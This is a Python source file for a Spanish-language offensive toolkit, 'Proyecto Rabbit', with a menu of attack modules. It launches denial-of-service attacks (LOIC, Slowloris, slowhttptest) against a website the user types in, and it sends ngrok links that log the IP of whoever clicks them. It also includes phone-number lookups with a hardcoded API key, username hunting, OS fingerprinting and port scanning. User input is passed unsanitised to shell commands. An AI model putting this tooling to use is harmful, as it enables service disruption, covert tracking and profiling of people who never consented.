#!/usr/bin/python3
# -*- coding: UTF-8

import time
import os
import sys
import requests
import json

#colores facheritos xd :)
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'

# variables ddos
seguir = " -H -c 9000 -i 10 -l 1000 -r 9000 -x 2 -k 10 -n 5 -z 50"
slow = " -timeout -num 1000 -cache"

# los def funciones

def limpiar():
   print("""
   
   Limpiando Pantalla x_x
   """)
   time.sleep(1)
   os.system("clear")

def ayuda():
   menu()
   opciones()

def portada():
   banner()
   opciones()


def informacion():
   print("""
   
   HERRAMIENTA CREADA POR MONKEY-HK4 -- PROYECTO RABBIT
   LA HERRAMIENTA PUEDE SER USADA POR CUALQUIER PERSONA QUE SEPA UTILIZARLA
   EN TEMAS DE SEGURIDAD INFORMATICA O PENTESTING
   NO ME HAGO RESPONSABLE POR EL MAL USO DE ESTA HERRAMIENTA

   INFO : 
   PROGRAMADA EN PYTHON Y BASH
   DISPONIBLE PARA LINUX

   INSTAGRAM: monkey_hk4
   GITHUB: Monkey-hk4
   TIKTOK: mhk4.oficial
   YOUTUBE: https://www.youtube.com/channel/UCEWGSsk-U9GjCLQk9ng1fNQ (Monkey-hk4) :)
 
   """)

# consulta de linea telefonica
def consulta_telefonica():
   print("""\033[36m      .      .        .         .    
       ▄█▌ ▄ ▄ ▐█▄   .    .    .     .   .     .       .   
       ██▌▀▀▄▀▀▐██ .    .    .      .   .     .   .        
       ██▌ ▄▄▄ ▐██   .   Phone Number Information .
       ▀██▌▐█▌▐██▀   .     .     .       .     .   .    
    ▄██████ ▀ ██████▄  .    .     .       .    . .         
   \033[37m
   """)

   api_key = 'a34d97f03e51e991d6699b9de0b8694c'
   number = input('Número: ')
   print("")

   # Petición

   data = requests.get("http://apilayer.net/api/validate?access_key=%s&number=%s&country_code&format=1" % (api_key, number))

   for key, value in data.json().items():

      print("%s: %s" % (key, value))

   print("")

# ataque ddos
def attack_ddos():
   print("""\033[31m
       ▄    ▄▄▄▄▄▄▄    ▄
      ▀▀▄ ▄█████████▄ ▄▀▀
          ██ ▀███▀ ██
        ▄ ▀████▀████▀ ▄   
      ▀█    ██▀█▀██    █▀
   \033[32m
   1 ) LOIC (Low orbit ion cannon)
   2 ) Slowloris
   3 ) HTTPTEST

   99 ) Salir del Módulo Ddos 

   """)
   dos_opc = input("\033[33m[\033[31m+\033[33m]\033[32m~Ddos: ")
   if dos_opc == "1":
      print("¡ Se esta instalando los requisitos  !")
      time.sleep(1)
      os.system("apt-get install mono-complete")
      os.system("cd modules && mono LOIC.exe")
      attack_ddos()

   elif dos_opc == "2":
      print("")
      print("Ejemplo: www.ejemplo.com")
      web = input("Introduzca la página web: ")
      os.system("cd modules/slowloris && perl slowloris.pl -dns " + web + slow)
      attack_ddos()


   elif dos_opc == "3":
      print("SE VA A INSTALAR SLOWHTTPTEST")
      os.system("apt-get install slowhttptest")
      print("""
      """)
      pagina = input("Página a atacar con http o https: ")
      print("Espere hasta se complete el ataque")
      time.sleep(2)
      os.system("slowhttptest -u " + pagina + seguir)
      attack_ddos()

   elif dos_opc == "99":
      print("")
      banner()
      opciones()

   else:
      print("ERROR OPCION INCORRECTA")
      time.sleep(1)
      attack_ddos()


def user():
   os.system("cd modules/nick_user && bash user.sh")
   opciones()


def ip_sistem():
   print("")
   direccion_ip = input("Dirección ip: ")
   os.system("cd modules && python3 sistema.py " + direccion_ip)
   print("")
   opciones()

def info_ip():
   os.system("cd modules && bash ovni.sh")
   print("""
   """)
   opciones()
   

def iplogger():
   os.system("cd modules/salvaip && bash iplogger.sh")
   print("""
   ............................................................
   """)
   opciones()

def puertos():
   os.system("cd modules && bash host.sh")
   print("""
   
   ............................................................
   """)
   opciones()

# baner fachero facherito 
def banner():
   print("""\033[32m

 \033[32m         WX0X                       WX0X
 \033[32m         Xc..cONW                WNk:..cX                                                   
 \033[32m         0,   .:kN              WO;.   ,K  \033[35m▪        . .      .            .         \033[31m▪            
 \033[32m         k.  .. .c0W          WKc. ..  .O   \033[37m  ▄▄▄·▄▄▄         ▄· ▄▌▄▄▄ . ▄▄· ▄▄▄▄▄          
 \033[32m        Wd.  .c:  .dNW       Nx.  :c.  .dM  \033[37m  █ ▄█▀▄ █·▪     ▐█▪██▌▀▄.▀·▐█ ▌▪•██  ▪     
 \033[32m        Wo    .lc. .lX      Xl. .:c.    oW  \033[37m  ██▀·▐▀▀▄  ▄█▀▄ ▐█▌▐█▪▐▀▀▪▄██ ▄▄ ▐█.▪ ▄█▀▄ 
 \033[32m        Wd.     :c.  oN    Nl.  ::.    .xM  \033[37m ▐█▪·•▐█•█▌▐█▌.▐▌ ▐█▀·.▐█▄▄▌▐███▌ ▐█▌·▐█▌.▐▌
 \033[32m         K;     .c:  .dW  Nd.  ;l.     ;K   \033[37m .▀   .▀  ▀ ▀█▄▀▪  ▀ •  ▀▀▀ ·▀▀▀  ▀▀▀  ▀█▄▀▪
 \033[32m         W0;     ;c.  .:ll:.  .l;     ;0M   \033[35m   .          .                 .            .
 \033[32m          WXl.   ;d,          ,d;   .lXM    \033[37m ▄▄▄   ▄▄▄· ▄▄▄▄· ▄▄▄▄· ▪  ▄▄▄▄▄     
 \033[32m            NO:. .;.          .:. .:OWM     \033[37m ▀▄ █·▐█ ▀█ ▐█ ▀█▪▐█ ▀█▪██ •██     .
 \033[32m             WNO;                ,kNM       \033[37m ▐▀▀▄ ▄█▀▀█ ▐█▀▀█▄▐█▀▀█▄▐█· ▐█.▪         \033[31m▪
 \033[32m             WWXl.               ;0WM       \033[37m ▐█•█▌▐█ ▪▐▌██▄▪▐███▄▪▐█▐█▌ ▐█▌· 
 \033[32m             Nk:,.              .';dX       \033[37m .▀  ▀ ▀  ▀ ·▀▀▀▀ ·▀▀▀▀ ▀▀▀ ▀▀▀    V 1.0
 \033[32m            No.'OKo'          .cOK:.:KW                                                        
 \033[32m           Wx. .l0XKd'      .cOXKx.  cX                                         \033[33m▪                
 \033[32m           X:    .';:,.     .;;'.    .O     .     ▪ \033[36mproyecto de David@mhk4         \033[35m.                                      
 \033[32m           X;          ,dxc.         .k                                .                         
 \033[32m           Wx.         .:c'         .lX               \033[33m.                          .                   
 \033[32m            W0o;..     .''..     .,ckN      .                    .      \033[33m▪                                      
 \033[32m               WX0xc.  .,,'. .;dOKN    \033[31m,               ▪                                            
 \033[32m                  WWXkoc::clxKWM                                        \033[35m▪              .                
 \033[32m  


   """)
   time.sleep(1)

# opciones del sistema
def menu():
   print("""\033[37m
   dump_phone     :   Datos de un número telefónico. 

   dump_ddos      :   Herramientas para hacer ataques de denegación de servicio.

   dump_user      :   Buscar nombres de usuarios en varios sitios web. 

   dump_sistem    :   Identificar sistema operativo por la dirección ip.

   dump_ip        :   Datos de una dirección ip pública.

   dump_iplogger  :   Enviar un link ngrok para optener la ip de quien acceda al enlace.

   dump_ports     :   Encontrar los puertos abiertos de un host

   help   :  Mostrar menú de opciones. 

   clear  :  Limpiar pantalla y reiniciar. 

   info   : Mostrar información de la herramienta.\033[39m
   
   """)

# Menú de opciones

def opciones():
   opcion = input("\033[32m[\033[31m+\033[32m]\033[37m~Rabbit: ")
   if opcion == "help":
      ayuda()

   elif opcion == "clear":
      limpiar()
      opciones()

   elif opcion == "banner":
      portada()

   elif opcion == "info":
      informacion()
      opciones()

   elif opcion == "dump_phone":
      consulta_telefonica()
      opciones()

   elif opcion == "dump_ddos":
      attack_ddos()
      opciones()

   elif opcion == "dump_user":
      user()

   elif opcion == "dump_sistem":
      ip_sistem()

   elif opcion == "dump_ip":
      info_ip()

   elif opcion == "dump_iplogger":
      iplogger()

   elif opcion == "dump_ports":
      puertos()


   else:
      print("\033[31m¡ OPCION NO VALIDA !")
      time.sleep(1)
      print("")
      opciones()


# iniciar el programa
banner()
opciones()


   

           
                                           
                                           
                                           
                                           
                                           
        
                                           
                                           
                                           
                                           
